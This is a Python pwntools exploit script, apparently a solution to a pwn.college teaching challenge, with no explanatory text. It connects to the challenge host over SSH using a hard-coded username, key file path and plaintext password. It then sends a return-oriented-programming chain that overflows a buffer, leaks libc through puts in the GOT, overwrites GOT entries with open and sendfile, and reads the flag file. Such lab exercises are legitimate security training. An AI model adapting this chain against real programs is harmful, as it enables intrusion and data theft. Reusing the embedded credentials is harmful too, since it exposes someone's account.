from pwn import *

e = ELF('./babyrop_level4_teaching1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

p = s.run('/babyrop_level4_teaching1')

rdi = 0x00000000004022fd
rsi = 0x00000000004022e5
rdx = 0x00000000004022ee
rcx = 0x00000000004022de

pay = b'A' * 0x48

pay += p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts'])
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.bss()+0x100) + p64(rdx) + p64(8) + p64(e.plt['read'])
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.got['puts']) + p64(rdx) + p64(8) + p64(e.plt['read'])
pay += p64(rdi) + p64(e.bss() + 0x100) + p64(rsi) + p64(0) + p64(e.plt['puts'])
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.got['puts']) + p64(rdx) + p64(8) + p64(e.plt['read'])
pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) + p64(rdx) + p64(0) + p64(rcx) + p64(100) + p64(e.plt['puts'])

p.sendafter(b'\n\n',pay)

p.recvuntil(b'Exiting!\n')
puts = u64(p.recvline().strip() + b'\x00\x00')
print(hex(puts))
base = puts - libc.symbols['puts']
libc.address = base

sleep(1)
p.send(b'/flag')
p.send(p64(libc.symbols['open']))
p.send(p64(libc.symbols['sendfile']))

p.interactive()
